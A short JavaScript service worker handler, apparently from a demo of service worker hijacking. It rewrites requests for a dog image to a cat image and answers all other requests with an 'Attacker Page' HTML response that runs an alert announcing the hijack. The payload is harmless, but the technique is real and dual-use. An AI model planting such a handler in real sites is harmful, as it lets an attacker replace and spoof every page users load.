self.getResponse = async function(url){  
  if (url == 'https://service-worker-lifecycle-demos.glitch.me/imgs/dog.svg'){
    url = 'https://service-worker-lifecycle-demos.glitch.me/imgs/cat.svg'
    response = await fetch(url)
    return response
  }
  response = new Response("<html> <head> <script> alert('SW Hijacked!!!') </script> </head> <body> <h1>Attacker Page!!!</h1> </body> </html>", {
    status: 200,
    headers: {
      "content-type": "text/html",
    },
  });
  
  return response
}
